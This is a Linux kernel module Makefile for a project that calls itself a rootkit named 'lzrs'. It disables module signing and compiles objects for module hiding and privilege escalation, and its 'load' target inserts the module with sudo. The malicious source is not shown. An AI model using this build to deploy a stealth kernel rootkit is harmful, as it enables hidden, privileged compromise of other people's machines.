CONFIG_MODULE_SIG=n

# module name
ROOTKIT		:= lzrs

# build
MODULE_DIR	:= /lib/modules/$(shell uname -r)
BUILD_DIR	:= $(MODULE_DIR)/build
KERNEL_DIR 	:= $(MODULE_DIR)/kernel

# source dirs
SRC_S 		:= src
LIB_S		:= src/lib
INCL_S		:= src/include

# header dirs
SRC_H		:= $(PWD)/$(SRC_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers
LIB_H		:= $(PWD)/$(LIB_S)/headers

# module object
obj-m		:= $(ROOTKIT).o

# core object
$(ROOTKIT)-y	+= src/core.o

# include
$(ROOTKIT)-y 	+= src/lib/syscall_lib.o
$(ROOTKIT)-y	+= src/include/utils.o
$(ROOTKIT)-y	+= src/module_hiding.o
$(ROOTKIT)-y	+= src/sys_escalation.o

ccflags-y 	:= -I$(SRC_H) -I$(LIB_H) -I$(INCL_H) -g -DDEBUG

# compilation
all:
	$(MAKE) -C $(BUILD_DIR) M=$(PWD) modules

load:
	sudo insmod lzrs.ko

clean:
	$(MAKE) -C $(BUILD_DIR) M=$(PWD) clean
